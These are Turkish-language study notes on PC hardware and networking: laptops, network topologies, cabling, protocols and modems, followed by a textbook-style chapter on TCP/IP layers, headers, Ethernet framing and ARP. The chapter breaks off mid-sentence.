· Farkları taşınabilmeleri. Pilleri vardır, sürekli elektriğe bağlı
olmaları gerekmez. Içinde kullanılan cihazlar daha ufaktır PC’ye
nazaran. Daha az elektrik sarfetmek üzere tasarlanmışlardır. Örneğin
HDD maximumum 5400 Rpm çalışır ki daha az elektrik harcasın.
· Laptop - Notebook : Laptoplar biraz daha büyük ve ağırdır.
Teknojileri biraz daha eskidir. Ismin değişmesine sebep, Amerika’da
açılan bir davadır. Laptop, dizüstü demek olduğu için, bir
Amerikalı’nın uzun süre kullanmdan dolayı dizleri yanıyor, davayı da bu
sebepten kazanınca artık Laptop değil Notebook denmeye başlıyor.
· PCMCIA (Personal Computer Memory Card International Association) :
Notebookların genişleme yuvalarıdır. NIC, Modem, External HDD..
takılabilir. Tipleri vardır :
o Tip 1 : 3,3 mm. External Memory takılabilir. (Sistem memory must exist, this is additional)
o Tip 2 : 5 mm. NIC, Modem takılabilir.
o Tip 3 : 10,5 mm. HDD takılabilir. (2 tane Tip2’ye aynı anda girer)
o Tip 4 : 12-13 mm. HDD takılabiliyor(du). Artık yok.
· Display : LCD kullanırlar. (Active matrix veya Passive Matrix)
· Pil : Artık tüm Notebooklar Li-ION pil kullanırlar. Eskiden Ni-Cd
ve Ni-MH kullanılırdı. Pilin şarj edilmeden önce bitmesi gerekiyordu.
Eğer bitmeden önce sarj edersen pilin ömrü kısalıyordu (Memory Effect).
Simdi de var ama eskisi kadar değil. En az memory effect en son çıkan
Li-Polymer pillerde vardır. (Ni-Cd, Ni-MH, Li-ION, Li-Polymer)
· Speedstep Teknolojisi : Dinamik olarak değişen CPU hızı. Pilin
kalan ömrüne göre bilgisayarın CPU’nun hızını değiştirerek daha fazla
dayanması. Pil azaldıkça CPU yavaşlar.
CHAPTER 14. Connectivity and Networking
· Network : En az iki bilgisayarın haberleşme, data ve diğer
kaynakların paylaşımı amacı ile birbirlerine bağlanmaları. Networklerin
büyük çoğunluğu kablo kullanarak kurulur. Ancak günümüzde kablosuz
teknolojiler de kullanıl-maya başlandı. Infrared, bluetooth ve wireless
networkler (802.11b) bunlara örnek olarak gösterilebilir.
· Basic Requirements of Network : Connections, communications and services.
o Connections : Bilgisayarların birbirlerine bağlayan fiziksel component-ler (hardware).
· The network medium : Kablo veya wireless radyo dalgaları
· The network interface : NIC. Ne işe yarar ? Datayı elektrik
sinyaline çevirip gönderir, gelen elektrik sinyallerini de dataya çevir.
o Communications : Bilgisayarların birbirleriyle haberleşebilmeleri
için gerekli kurallar. Bilgisayarlar farklı OS’ler kullansalar da aynı
dilden konuşmaları lazım.
o Services : Bilgisayarlar networke fiziksel olarak bağlı da
olsalar, kaynaklarını paylaşmazlarsa bir anlamı olmaz. Kaynaklar neler
olabilir ? Dosyalar, printer, scanner, Cd, DVD etc.
· LAN - WAN : Farkları nedir ? Hızdır. Yanlız araya Router girerse, networkler farklı ise wan diyebiliriz.
· Network Tipleri : Peer-to-peer networks ve Server based networks.
o Peer to peer networks (Workgroup) : Her bilgisayar hem server
(resource’lerını paylaştıran) hem de client (diger bilgisayarların
resource’larını kullanan) olarak çalışır. Her PC kendi güvenliğinden
sorumludur ve hangi kaynaklarını paylaştıracağını kendi belirler. 15-20
PC barındıran networkler için uygun olabilir.
o Server based networks (Domain) : Çoğu şirket networklerinde
kullanılan, bir veya daha çok bilgisayarın server görevini üstlenerek
sistemin güvenliğini, paylaşım kurallarını ve yönetimini sağladığı
sistemdir. (NT4, Win2K, Win2K3, Netware)
· Network Topology : Local Area Network’lerin dizayn edilme yöntemlerine topology denir.
o Star : Her bilgisayar merkezde bir cihaza bağlıdır. (Hub, switch)
Merkezdeki bozulursa hepsi kopar ama diğerlerinde oluşabilecek bozukluk
sadece kendisini etkiler.
 
o Bus : Bilgisayarların birbirlerinin arkasına daisy chain
bağlanmaları, star’a göre troubleshoot’u daha zordur, bir PC çökerse
tüm network çöker. Her iki uca da sonlandırıcı takmak gerekir sinyal
yansımasını önlemek için. Ethernet network de denir.
 
o Ring : Networkde sürekli bir token döner, PC token kendisine
geldiğinde içi boş ise datayı yükler ve gönderir. Makinalar repeater
gibi davranırlar, bu yüzden sinyaller güçlüdür. Aynı anda
konuşa-mazlar, bir bilgisayar çökerse tüm network çöker. Token ring network de denir.
 
· Network Interface Cards (NIC) : Bilgisayar ile kabloyu bağlayan
cihazdır. Bilgisayardan gelen datayı kablo üzerinde yolculuk edebilecek
elektrik sinyallerine çevirip paketler ve gönderir. Computerlar
networkden çok daha hızlı oldukları için, gönderilmek istenen datayı
belli süre cache’inde tutarak buffering de yapar ve sırası gelince
gönderir.
Mac Adresi, her NIC üzerinde unique olan bir hexedecimal
sayıdır. Ipconfig /all ile görülebilir. 00-EA-3A-FF-00-F6 gibidir. İlk
3 hane üreticiyi temsil eder.
· Network Cabling : 3 tip kablo vardır : Twisted Pair, Coaxial ve Fiberoptik.
o Twisted Pair : Unshielded Twisted Pair (UTP-65m) ve Shielded
Twisted Pair (STP-100m). STP’de dış koruma olduğu için dış etkenlerden
daha az etkilenir o yüzden datayı daha uzağa taşıyabilir. UTP kablo
daha çok kullanılır.
o CAT 1 : Telefon kablosu, 2 tel.
o CAT 2 : 4 Mbps data taşıyabilir. (4 çift 8 tel)
o CAT 3 : 10 Mbps data taşıyabilir. (4 çift 8 tel)
o CAT 4 : 16 Mbps data taşıyabilir. (4 çift 8 tel)
o CAT 5 : 100 Mbps data taşıyabilir. (4 çift 8 tel)
o CAT 5e : 1 Gbps data taşıyabilir. (Tellerin materyalleri farklı olduğu için hızları farklı)
o Coaxial Cable : Televizyon kablosuna benzer, farkı taşıyabildiği
Ohm. Çok iyi korumalı bir kablo olduğu için datayı çok uzağa
taşıyabilir.
10 base 2 (thinnet) : 185 metre - 10 Mbps
10 base 5 (thicknet) : 500 metre - 10 Mbps
· Network Protocols : Birbirlerinden farklı veya aynı OS’ler
kullanan bilgisayar-ların network ortamında birbirleri ile
konuşabilmeleri için aynı dilden konuşmaları gerekir. Bu dillere
protocol denir.
· TCP/IP (Open Protocol - Herkes kullanır)
· IPX/SPX (Vendor Specific - Novell)
· NetBEUI (Vendor Specific - Microsoft)
· AppleTalk (Vendor Specific - Macintosh)
· Repeater : Sinyal güçlendirici. 95nci metreye koyarsan 200 metreye data taşınabilir.
· Switch, Hub : Santral gibi, birçok kabloyu bağlayabilirsin.
Farkları, hub bir portdan gelen datayı tüm portlara basar, switch
sadece ilgili porta basar.
· Bridge : İki ayrı network segmentini birbirine bağlar. İki segmentde de aynı protocol olmalı.
· Router : Bridge’den farkı, farklı protocolleri translate eder.
· Gateway : İzinlerin kontrol edildiği çıkış kapıları. (Proxy, ISA)
CHAPTER 15. Modems and the Internet
· Modem : Modulatör - Demodülatör. Analog sinyali digital sinyale,
digital sinyali analog sinyale çevirir. Bilgisayarlar analog
sinyallerden anlamazlar. Sadece 1 ve 0’lardan anlarlar.
 
· UART Chip : Bilgisayar içinde data 8,16,32,64 bit transfer edilir.
Fakat modem serial çalışabildiği için datanın paralel’den serial’e
çevrilmesi lazımdır. UART Chip bu görevi üstlenir (16550A). Eğer
modemin kendi üzerinde UART chip varsa Hard Modem (External veya pahalı Internal), UART chip yoksa Soft Modemdir (ucuz Internal modemler).
· Digital Communication : Telefon hatları üzerinden haberleşmede iki
step vardır. Once paralel sinyaller seri sinyallere çevrilir, sonra
unique paketlere ayrılarak gönderilir.
o Asynchronous Communication : Belli bir zamanlama yoktur, her data
gönderiminin başına bir start bit, sonuna da stop bit eklenir. Daha
yavaştır.
o Synchronous Communication : Bağlantının başında modemler
karşılıklı time interval için anlaşırlar ve bu interval içerisinde
birbirlerine data gönderirler. Daha hızlı ama pahalıdır.
· Half Duplex : RJ-11 ile bağlanan, 2 kablolu, datanın ya gittiği ya
da geldiği bağlantı. (Apartman diafonu gibi, düğmeye bas konuş, çek
dinle)
· Full Duplex : RJ-12 ile bağlanan, 4 kablolu, datanın aynı anda
gidip gelebildiği bağlantı. Çift hat çalıştığı için 2 kat daha çok
telefon ücreti.
· Baud Rate : Eskiden 1 baud’da (cycle) 1 bit gönderilebiliyordu
(=2400 bps), artık yaklaşık 23 bit gönderilebiliyor (=56600 bps).
· Modem Tipleri (Protocoller) :
o Xmodem : Error correction. 128 byte’da 1 parity gönderiyor.
o Ymodem : Error correction. 1024 byte’da 1 parity gönderiyor.
o Zmodem : Error correction+Data compresion. Şu an Zmodem kullanılıyor.
· Crash Recovery : Download’ı durdurdun, yeniden kaldığın yerden
devam edebilmeye denir. Zmodem gerekir, 3rd party program bile olsa
Xmodem ve Ymodem’de çalışmaz.
· Automatic Downloading : Link’e tıkladığında downloadın sana
sorarak başlaması. (Bazı sitelerdeki, eğer download başlamadıysa buraya
tıklayın yazıları X ve Ymodemler içindir)
· Streaming File Transfer : Internetten radyo, TV seyretme özelliği. Data compression sayesinde sadece Zmodemde var.
· Handshaking : Internete bağlanmak istediğimizde, bizim modem ile
ISP’nin modemi birbirlerinin ortak noktalarını buluyorlar (karşılıklı
cızırtılar esnasında).
· Modem Commands : Manual kullanım için kullanılan commandlar. Modem
özelliklerinde query modem yaparsan bu commandları göndererek query
yapar sistem.
o AT : Modem takılı ve düzgün çalışıyor mu ?
o ATD : ATDT08222630000. Numara çevirme codu. (2. T Tone dial, eğer santralden çıkacaksan 2.T’den sonra W yazacaksın)
o ATH : Hangs up modem.
o ATX : Reset modem to predefined state.









IP VE SUBNETTING KAVRAMI-SUBNET MASKALT AĞ MASKESİ
 
 
 

 12 
  TCP/IP ve Bileşenleri 
Şu ana kadar bilgisayar ağı kavramları ve ağ yapısının fiziksel katmanları hakkında genel bir fikir edindik. Bu noktada bilgisayarlar arası iletişimi sağlayan temel protokol katmanlarına gelmiş bulunuyoruz. Burada okuyucuya alt yapı protokolleri ile ilgili detaylı ancak çok teknik olmayan bilgiler verilecek ve sistemin temel çalışma prensipleri açıklanmaya çalışılacaktır. 
 Genel Tanımlar 
TCP/IP OSI modelinin de tanımlandığı gibi katmanlardan oluşan bir protokoller kümesidir. Ancak OSI modelinde  tanımlanan tüm katmanlar birebir TCP/IP katmanlarında bulunmamaktadır. OSI’nin sunum ve oturum katmanları burada uygulama katmanında yer almakta,  yönlendirme katmanı da diğer alt katmanları kapsamaktadır.  
TCP/IP’de  her katman değişik görevlere sahip olup altındaki ve üstündeki katmanlar ile gerekli bilgi alışverişini sağlamakla yükümlüdür. Aşağıdaki şekilde bu katmanlar bir blok şema halinde gösterilmektedir. 
 
 	Çizim 12-1 TCP/IP katmanları 
TCP/IP katmanlarının tam olarak ne olduğu, nasıl çalıştığı konusunda bir fikir sahibi olabilmek için bir örnek üzerinde inceleyelim:   
TCP/IP’nin kullanıldığı en önemli servislerden birisi elektronik postadır (e-posta). Eposta servisi için bir uygulama protokolu belirlenmiştir  (SMTP).  Bu   protokol  eposta’nın bir bilgisayardan bir başka  bilgisayara nasıl iletileceğini belirler. Yani epostayı gönderen ve  alan kişinin adreslerinin belirlenmesi, mektup içeriğinin hazırlanması  vb. gibi. Ancak e-posta servisi bu mektubun bilgisayarlar arasında  nasıl  iletileceği ile ilgilenmez, iki bilgisayar arasında  bir  iletişimin olduğunu varsayarak mektubun yollanması görevini TCP ve IP  katmanlarına bırakır. TCP katmanı komutların karşı tarafa ulaştırılmasından sorumludur. Karşı tarafa  ne yollandığı ve hatalı yollanan mesajların tekrar yollanmasının  kayıtlarını tutarak  gerekli kontrolleri yapar. Eğer gönderilecek mesaj bir kerede gönderilemeyecek kadar büyük ise (Örneğin uzunca bir e-posta  gönderiliyorsa) TCP onu uygun boydaki segment’lere (TCP katmanlarının iletişim için kullandıkları birim bilgi miktarı) böler ve bu  segment’lerin  karşı tarafa doğru sırada, hatasız olarak ulaşmalarını  sağlar. Internet üzerindeki tek servis e-posta olmadığı için ve  segment’lerin karşı tarafa hatasız ulaştırılmasını sağlayan iletişim yöntemine  tüm diğer servisler de ihtiyaç duyduğu için TCP ayrı bir katman olarak  çalışmakta ve tüm diğer servisler onun üzerinde yer almaktadır.  Böylece  yeni  bir  takım  uygulamalar  da  daha   kolay  geliştirilebilmektedir. Üst seviye uygulama protokollerinin TCP katmanını çağırmaları gibi  benzer şekilde TCP de IP katmanını çağırmaktadır. Ayrıca  bazı  servisler TCP katmanına ihtiyaç duymamakta ve bunlar direk olarak IP katmanı  ile görüşmektedirler. Böyle belirli görevler için belirli hazır yordamlar  oluşturulması  ve protokol seviyeleri  inşa  edilmesi  stratejisine ‘katmanlaşma’ adı verilir. Yukarıda verilen örnekteki e- posta servisi (SMTP), TCP ve IP ayrı katmanlardır ve her katman altındaki diğer  katman ile konuşmakta diğer bir deyişle onu çağırmakta ya da onun sunduğu sevisleri kullanmaktadır. En genel haliyle TCP/IP uygulamaları 4 ayrı katman kullanır. Bunlar: 
-	Bir uygulama protokolü, mesela e-posta   
-	Üst seviye uygulama protokollerinin gereksinim duyduğu TCP gibi bir protokol  katmanı 
-	IP  katmanı. Gönderilen bilginin  istenilen  adrese   yollanmasını sağlar.    
-	Belirli bir fiziksel ortamı sağlayan protokol katmanı.   Örneğin Ethernet, seri hat, X.25 vb.    
Internet birbirine geçiş yolları (gateway) ile bağlanmış çok sayıdaki  bağımsız bilgisayar ağlarından oluşur ve buna “catenet model” adı  verilir. Kullanıcı bu ağlar üzerinde yer alan herhangi bir bilgisayara  ulaşmak isteyebilir. Bu işlem esnasında kullanıcı farkına varmadan bilgiler, düzinelerce ağ üzerinden geçiş yapıp varış yerine ulaşırlar. Bu kadar işlem esnasında kullanıcının bilmesi gereken tek şey ulaşmak istediği noktadaki bilgisayarın ‘Internet adresi’ dir. Bu  adres toplam 32 bit uzunluğunda bir sayıdır. Fakat bu sayı 8 bitlik 4  ayrı ondalık sayı şeklinde kullanılır (144.122.199.20 gibi). Bu 8  bitlik gruplara ‘octet’ ismi de verilir. Bu adres yapısı genelde  karşıdaki sistem hakkında bilgi de verir. Mesela 144.122 ODTÜ için  verilmiş bir numaradır. ODTÜ üçüncü octet’i kampüs içindeki birimlere dağıtmıştır. Örneğin,  144.122.199  bilgisayar  merkezinde bulunan bir  Ethernet  ağda  kullanılan bir adrestir. Son octet ise bu Ethernete 254  tane  bilgisayar bağlanmasına izin verir (0 ve 255 bilgisayar adreslemesinde kullanılmayan özel amaçlı adresler olduğu için 254  bilgisayar  adreslenebilir).  
IP bağlantısız “connectionless” ağ teknolojisini kullanmaktadır ve bilgi “datagramlar” (TCP/IP temel bilgi birim miktarı) dizisi halinde bir noktadan diğerine iletilir.  Büyük bir bilgi grubunun (büyük bir dosya veya e-posta gibi)  parçaları olan “datagram” ağ üzerinde tek başına yol alır. Mesela  15000 octet’lik bir kütük pek çok ağ tarafından bir kere de  iletilemeyecek kadar büyük olduğu için protokoller bunu 30 adet 500  octetlik datagramlara böler. Her datagram ağ üzerinden tek tek  yollanır ve bunlar karşı tarafta yine 15000 octet lik bir kütük olarak  birleştirilir. Doğal olarak önce yola çıkan bir datagram kendisinden  sonra yola çıkan bir datagramdan sonra karşıya varabilir veya ağ  üzerinde oluşan bir hatadan dolayı bazı datagramlar yolda kaybolabilir.  Kaybolan veya yanlış sırada ulaşan datagramların sıralanması veya  hatalı gelenlerin yeniden alınması hep üst seviye protokollerce  yapılır.  Bu arada “paket” ve “datagram” kavramlarına bir açıklama getirmek  yararlı olabilir. TCP/IP ile ilgili kavramlarda “datagram” daha doğru  bir terminolojidir. Zira datagram TCP/IP de iletişim için kullanılan birim  bilgi miktarıdır. Paket ise fiziksel ortamdan (Ethernet, X.25 vb.)  ortama değişen bir büyüklüktür. Mesela X.25 ortamında datagramlar 128  byte’lık paketlere dönüştürülüp fiziksel ortamda böyle taşınırlar ve  bu işlemle IP seviyesi hiç ilgilenmez. Dolayısıyla bir IP datagramı X.25  ortamında birden çok paketler halinde taşınmış olur.           
 TCP Katmanı   
TCP’nin (“transmission control protocol-iletişim kontrol protokolü”)  temel işlevi, üst katmandan (uygulama katmanı) gelen bilginin segment’ler haline dönüştürülmesi, iletişim ortamında kaybolan bilginin tekrar  yollanması ve ayrı sıralar halinde gelebilen bilginin doğru sırada  sıralanmasıdır.  IP (“internet protocol”) ise tek tek datagramların  yönlendirilmesinden sorumludur. Bu açıdan bakıldığında TCP katmanının  hemen hemen tüm işi üstlendiği görülmekle beraber (küçük ağlar için bu  doğrudur) büyük ve karmaşık ağlarda IP katmanı en önemli görevi  üstlenmektedir. Bu gibi durumlarda değişik fiziksel katmanlardan geçmek, doğru yolu  bulmak çok karmaşık bir iş halini almaktadır.  
Şu ana kadar sadece Internet adresleri ile bir noktadan diğer noktaya  ulaşılması konusundan bahsettik ancak birden fazla kişinin aynı  sisteme ulaşmak istemesi durumunda neler olacağı konusuna henüz bir  açıklık getirmedik. Doğal olarak bir segment’i doğru varış noktasına  ulaştırmak tek başına yeterli değildir. TCP bu segment’in  kime ait olduğunu da  bilmek zorundadır. “Demultiplexing” bu soruna çare bulan yöntemdir.  TCP/IP‘de değişik seviyelerde “demultiplexing” yapılır. Bu işlem için  gerekli bilgi bir seri “başlık” (header) içinde bulunmaktadır. Başlık,  datagram’a eklenen basit bir kaç octet’den oluşan bir bilgiden  ibarettir. Yollanmak istenen mesajı bir mektuba benzetecek olursak  başlık o mektubun zarfı ve zarf üzerindeki adres bilgisidir. Her  katman kendi zarfını ve adres bilgisini yazıp bir alt katmana  iletmekte ve o alt katmanda onu daha büyük bir zarfın içine koyup  üzerine adres yazıp diğer katmana iletmektedir. Benzer işlem varış  noktasında bu sefer ters sırada takip edilmektedir.  
Bir örnek vererek  açıklamaya çalışırsak: Aşağıdaki noktalar ile gösterilen satır bir noktadan diğer bir noktaya  gidecek olan bir dosyayı temsil etsin,  ............... 
TCP katmanı bu dosyayı taşınabilecek büyüklükteki parçalara ayırır (Üçer üçer ayrılmış noktalar): 
  	...  ...  ...  ...  ... 
Her segment’in  başına TCP bir başlık koyar. Bu başlık bilgisinin en  önemlileri ‘port numarası’ ve ‘sıra numarası’ dır. Port numarası, örneğin  birden fazla kişinin aynı anda dosya yollaması veya karşıdaki bilgisayara bağlanması durumunda TCP’nin herkese  verdiği farklı bir numaradır. Üç kişi aynı anda dosya transferine  başlamışsa TCP, 1000, 1001 ve 1002 “kaynak” port numaralarını bu üç  kişiye verir böylece herkesin paketi birbirinden ayrılmış olur. Aynı  zamanda varış noktasındaki TCP de ayrıca bir “varış” port numarası  verir. Kaynak noktasındaki TCP’nin varış port numarasını bilmesi  gereklidir ve bunu iletişim kurulduğu anda TCP karşı taraftan öğrenir. Bu bilgiler  başlıktaki “kaynak” ve “varış” port numaraları olarak belirlenmiş  olur. Ayrıca her segment  bir “sıra” numarasına sahiptir. Bu numara  ile karşı taraf doğru sayıdaki segmenti  eksiksiz alıp almadığını  anlayabilir. Aslında TCP segmentleri  değil octet leri numaralar.  Diyelim ki her datagram içinde 500 octet bilgi varsa ilk datagram  numarası 0, ikinci datagram numarası 500, üçüncüsü 1000 şeklinde  verilir. Başlık içinde bulunan üçüncü önemli bilgi ise “kontrol toplamı”  (Checksum) sayısıdır. Bu sayı segment  içindeki tüm octet’ler  toplanarak hesaplanır ve sonuç başlığın içine konur. Karşı noktadaki  TCP  kontrol toplamı hesabını tekrar yapar. Eğer  bilgi  yolda  bozulmamışsa kaynak noktasındaki hesaplanan sayı ile varış noktasındaki hesaplanan sayı aynı  çıkar. Aksi takdirde segment yolda bozulmuştur bu durumda bu datagram  kaynak noktasından tekrar istenir.  Aşağıda bir TCP segmenti  örneği verilmektedir.  
 
Kaynak Portu 	Varış Portu 
                               Sıra numarası 
 	Onay (Acknowledgement) 
								
Data Offset 	 Reserve 	U
R 
G	A
C 
K	P 
S 
H	R 
S 
T 	S 
Y
N	F 
I 
N	Pencere (Window)
   Kontrol Toplamı	   Acil işareti (Urgent Pointer) 
  
       Bilgi ........  diğer 500 octet 
 
 	Çizim 12-2 TCP Segmenti 
Eğer TCP başlığını “T” ile gösterecek olursak yukarda noktalarla  gösterdiğimiz dosya aşağıdaki duruma gelir:  
 	    T...  T...  T...  T...  T...    
Başlık içinde bulunan diğer bilgiler genelde iki bilgisayar arasında  kurulan bağlantının kontrolüne yöneliktir. Segment’in  varışında alıcı  gönderici  noktaya  bir  “onay” (acknowledgement) yollar. Örneğin  kaynak noktasına yollanan “onay numarası” (Acknowledgement number)  1500 ise octet numarası 1500 e kadar tüm bilginin alındığını gösterir.  Eğer  kaynak noktası belli bir zaman içinde bu bilgiyi  varış  noktasından alamazsa o bilgiyi tekrar yollar. “Pencere” bilgisi bir  anda ne kadar bilginin gönderileceğini kontrol etmek için kullanılır.  Burada amaç her segment’in  gönderilmesinden sonra karşıya ulaşıp  ulaşmadığı ile ilgili onay (ack) beklenmesi yerine segment’leri  onay  beklemeksizin pencere bilgisine göre yollamaktır. Zira yavaş hatlar  kullanılarak yapılan iletişimde onay beklenmesi iletişimi çok daha  yavaşlatır. Diğer taraftan çok hızlı bir şekilde sürekli segment   yollanması karşı tarafın bir anda alabileceğinden fazla bir trafik  yaratacağından yine problemler ortaya çıkabilir. Dolayısıyla her iki  taraf o anda ne kadar bilgiyi alabileceğini “pencere” bilgisi içinde  belirtir. Bilgisayar bilgiyi aldıkça pencere alanındaki boş yer azalır  ve sıfır olduğunda yollayıcı bilgi yollamayı durdurur. Alıcı nokta  bilgiyi işledikçe pencere artar ve bu da yeni bilgiyi karşıdan kabul  edebileceğini gösterir. “Acil işareti” ise bir kontrol karakteri veya  diğer bir komut ile transferi kesmek vb. amaçlarla kullanılan bir  alandır. Bunlar dışında ki alanlar TCP protokolünün detayları ile ilgili olduğu  için burada anlatılmayacaktır.    
 IP Katmanı    
TCP katmanına  gelen bilgi segmentlere ayrıldıktan sonra  IP katmanına yollanır. IP katmanı, kendisine gelen TCP segment’i  içinde ne olduğu ile ilgilenmez. Sadece kendisine verilen bu bilgiyi ilgili IP adresine yollamak amacındadır. IP katmanının görevi bu segment  için ulaşılmak istenen  noktaya gidecek bir “yol” (route) bulmaktır. Arada geçilecek sistemler ve geçiş yollarının bu paketi doğru yere geçirmesi için kendi başlık bilgisini TCP katmanından gelen segment’e ekler. TCP katmanından gelen segment’lere IP başlığının eklenmesi ile oluşturulan IP paket birimlerine “datagram” adı verilir. IP başlığı eklenmiş bir datagram aşağıdaki çizimde  gösterilmektedir:  
Versiyon  	 IHL	    Servis tipi   	   Toplam uzunluk 
 	Tanımlama               	  Bayrak   	  Fragment offset 
 Yaşam süresi (TTL)	   Protokol	      Başlık kontrol toplamı
 	Kaynak Adresi 
 	Varış Adresi 
 
 	TCP başlığı ve iletilen bilgi  
 
 	Çizim 12-3 IP Datagram 
Bu başlıktaki temel bilgi kaynak ve varış Internet adresi (32-bitlik adres, 144.122.199.20 gibi), protokol numarası ve kontrol  toplamıdır. Kaynak  Internet  adresi  tabiiki  sizin  bilgisayarınızın Internet adresidir. Bu sayede varış noktasındaki  bilgisayar bu paketin nereden geldiğini anlar. Varış Internet adresi  ulaşmak istediğiniz bilgisayarın adresidir. Bu bilgi sayesinde aradaki  yönlendiriciler veya geçiş yolları (gateway) bu datagram’ı nereye yollayabileceklerini  bilirler. Protokol numarası IP’ye karşı tarafta bu datagram’ı TCP’ye  vermesi gerektiğini söyler. Her ne kadar IP trafiğinin çoğunu TCP  kullansa  da  TCP dışında  bazı  protokollerde  kullanılmaktadır  dolayısıyla protokoller arası bu ayrım protokol numarası ile belirlenir. Son olarak  kontrol toplamı IP başlığının yolda bozulup bozulmadığını kontrol  etmek için kullanılır. Dikkat edilirse TCP ve IP ayrı ayrı kontrol  toplamları kullanmaktalar. IP kontrol toplamı başlık  bilgisinin  bozulup bozulmadığı veya mesajın yanlış yere gidip gitmediğini kontrol  için kullanılır. Bu protokollerin tasarımı sırasında TCP’nin ayrıca bir  kontrol toplamı hesaplaması ve kullanması daha verimli ve güvenli  bulunduğu için iki ayrı kontrol toplamı alınması yoluna gidilmiştir. 
IP başlığını “I” ile gösterecek olursak IP katmanından çıkan ve TCP verisi taşıyan bir  datagram şu hale gelir:  
 	IT...IT...IT...IT...IT... 
Başlıktaki “Yaşam süresi” (Time to Live) alanı IP paketinin yolculuğu  esnasında geçilen her sistemde bir azaltılır ve sıfır olduğunda bu  paket yok edilir. Bu sayede oluşması muhtemel sonsuz döngüler ortadan  kaldırılmış olur.  IP katmanında artık başka başlık eklenmez ve iletilecek bilgi  fiziksel iletişim ortamı üzerinden yollanmak üzere alt katmana (bu  Ethernet, X.25, telefon hattı vb. olabilir) yollanır.     
 Fiziksel Katman 
 
Fiziksel katman gerçekte “Data Link Connection” (DLC) ve Fiziksel ortamı içermektedir. Ancak biz burada bu ara katmanları genelleyip tümüne Fiziksel katman adını vereceğiz. Günümüzde pek çok bilgisayar ağının Etherneti temel iletişim ortamı     olarak kullanmasından dolayı da Ethernet teknolojisini örnek olarak anlatacağız. Dolayısıyla burada Ethernet ortamının  TCP/IP ile olan iletişimini açıklayacağız.  
Ethernet kendine has bir ağ adresleme yöntemi kullanır. Ethernet teknolojisi tasarlanırken  dünya üzerinde  herhangi bir yerde kullanılan bir Ethernet kartının tüm  diğer  kartlardan ayrılmasını sağlayan bir mantık izlenmiştir. Ayrıca,  kullanıcının Ethernet adresinin ne olduğunu düşünmemesi için her Ethernet kartı  fabrika çıkışında kendisine has bir adresle piyasaya verilmektedir.  Her Ethernet kartının kendine has numarası olmasını sağlayan tasarım 48 bitlik  fiziksel adres yapısıdır. Ethernet kart üreticisi firmalar merkezi  bir  otoriteden  üretecekleri kartlar için belirli büyüklükte  numara  blokları alır ve üretimlerinde bu numaraları kullanırlar. Böylece  başka bir üreticinin kartı ile bir çakışma meydana gelmez.   
Ethernet teknoloji olarak yayın teknolojisini (broadcast medium)  kullanır. Yani bir istasyondan Ethernet ortamına yollanan bir paketi o  Ethernet ağındaki tüm istasyonlar görür. Ancak doğru varış noktasının  kim olduğunu,  o ağa bağlı makinalar Ethernet başlığından anlarlar. Her  Ethernet paketi 14 octet’lik bir başlığa sahiptir. Bu başlıkta kaynak  ve varış Ethernet adresi ve bir tip kodu vardır. Dolayısıyla ağ  üzerindeki her makina bir paketin kendine ait olup olmadığını bu  başlıktaki  varış noktası bilgisine bakarak anlar (Bu  Ethernet  teknolojisindeki en önemli güvenlik boşluklarından birisidir). Bu  noktada Ethernet adresleri ile Internet adresleri arasında  bir  bağlantı olmadığını belirtmekte yarar var. Her makina hangi Ethernet  adresinin hangi Internet adresine karşılık geldiğini tutan bir tablo  tutmak  durumundadır  (Bu  tablonun  nasıl  yaratıldığı  ilerde  açıklanacaktır). Tip kodu alanı aynı ağ üzerinde farklı protokollerin  
kullanılmasını sağlar. Dolayısıyla aynı anda TCP/IP, DECnet, IPX/SPX  gibi protokoller aynı ağ üzerinde çalışabilir. Her protokol başlıktaki  tip alanına kendine has numarasını koyar. Kontrol toplamı (Checksum)  alanındaki değer ile komple paket kontrol edilir. Alıcı ve vericinin  hesapladığı değerler birbirine uymuyorsa paket yok edilir. Ancak  burada kontrol toplamı başlığın içine değilde paketin sonuna konulur.  Ethernet katmanında işlenip gönderilen mesaj ya da bilginin (Bu bilgi paketlerine frame adı verilir) son hali aşağıdaki duruma gelir:  
 
 
 
 
 
 
 
 
 
 
  	Ethernet varış adresi (İlk 32 bit) 
Ethernet varış  (İlk 16 bit)     Ethernet kaynak (ilk16 bit) 
 	Ethernet kaynak adresi (son 32 bit) 
 	Tip Kodu 
 
 	IP başlık, TCP başlık, iletilen bilgi 
 ................................................ 
 	bilginin sonu 
 	Ethernet kontrol toplamı (checksum) 
 
 	Çizim 12-4 Ethernet Paketi 
Ethernet başlığını “E” ile ve Kontrol toplamını “C” ile gösterirsek  yolladığımız dosya şu şekli alır:  
 	EIT...C  EIT...C  EIT...C  EIT...C  EIT...C 
Bu paketler (frame) varış noktasında alındığında bütün başlıklar  uygun  katmanlarca atılır. Ethernet arayüzü Ethernet başlık ve kontrol  toplamını atar. Tip koduna bakarak protokol tipini belirler ve  Ethernet cihaz sürücüsü (device driver) bu datagram’ı IP katmanına  geçirir. IP katmanı kendisi ile ilgili katmanı atar ve  protokol  alanına bakar, protokol alanında TCP olduğu için segmenti TCP  katmanına geçirir. TCP sıra numarasına bakar, bu bilgiyi ve diğer  bilgileri iletilen dosyayıyı orijinal durumuna getirmek için kullanır.  Sonuçta bir bilgisayar diğer bir bilgisayar ile iletişimi tamamlar.      
 Ethernet Encapsulation: ARP 
Yukarıda Ethernet üzerinde IP datagramların nasıl yer aldığından  bahsettik. Fakat açıklanmadan kalan bir nokta bir Internet adresi ile  iletişime geçmek için hangi Ethernet adresine ulaşmamız gerektiği  idi. Bu amaçla kullanılan  protokol ARP’dir  (“Address  Resolution Protocol”). ARP aslında bir IP protokolü değildir ve  dolayısıyla ARP datagramları IP başlığına sahip değildir. Varsayalımki  bilgisayarınız 128.6.4.194 IP adresine sahip ve siz de 128.6.4.7 ile  iletişime geçmek istiyorsunuz. Sizin sisteminizin ilk kontrol edeceği  nokta 128.6.4.7 ile aynı ağ üzerinde olup olmadığınızdır. Aynı ağ üzerinde yer alıyorsanız, bu Ethernet  üzerinden direk olarak haberleşebileceksiniz anlamına gelir.  Ardından  128.6.4.7 adresinin ARP tablosunda olup olmadığı ve Ethernet adresini  bilip bilmediği kontrol edilir. Eğer tabloda bu adresler varsa  Ethernet başlığına eklenir ve paket yollanır. Fakat tabloda adres  yoksa paketi yollamak için bir yol yoktur. Dolayısıyla burada ARP  devreye girer. Bir ARP istek paketi ağ üzerine yollanır ve bu paket  içinde “128.6.4.7” adresinin Ethernet adresi nedir sorgusu vardır. Ağ  üzerindeki  tüm  sistemler  ARP isteğini  dinlerler  bu  isteği  cevaplandırması gereken istasyona bu istek ulaştığında cevap ağ  üzerine 